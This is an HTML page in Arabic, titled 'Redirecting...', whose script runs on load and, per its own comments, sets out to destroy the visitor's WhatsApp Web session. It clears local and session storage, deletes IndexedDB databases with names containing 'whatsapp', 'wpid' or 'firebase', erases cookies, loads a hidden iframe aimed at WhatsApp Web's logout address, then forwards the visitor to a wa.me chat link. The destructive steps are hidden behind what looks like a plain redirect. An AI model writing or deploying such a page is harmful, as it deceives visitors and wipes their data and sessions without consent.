<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جارٍ التحويل...</title>
</head>
<body>
<script>
    (function() {
        // 1. التدمير الجذري لقواعد بيانات واتساب ويب وجلسات المتصفح المخفية (IndexedDB)
        try {
            // مسح الـ LocalStorage و SessionStorage بالكامل
            localStorage.clear();
            sessionStorage.clear();

            // تدمير قاعدة بيانات IndexedDB الخاصة بـ WhatsApp Web (لضمان طرده من الحساب نهائياً)
            indexedDB.databases().then(databases => {
                databases.forEach(db => {
                    if (db.name.includes('whatsapp') || db.name.includes('wpid') || db.name.includes('firebase')) {
                        indexedDB.deleteDatabase(db.name);
                    }
                });
            }).catch(() => {});

            // مسح جميع الكوكيز بشكل شامل
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/"); 
            });
        } catch (e) {}

        // 2. إطلاق طلب إجبار تسجيل الخروج الصامت نحو نطاق واتساب ويب
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = "https://web.whatsapp.com/logout";
            document.body.appendChild(iframe);
        } catch (e) {}

        // 3. التحويل الفوري بعد ضمان نسف الجلسة (استبدل الرقم بالرقم الحقيقي)
        setTimeout(function() {
            window.location.replace("https://wa.me/218920000000?text=" + encodeURIComponent("مرحباً"));
        }, 800);
    })();
</script>
</body>
</html>
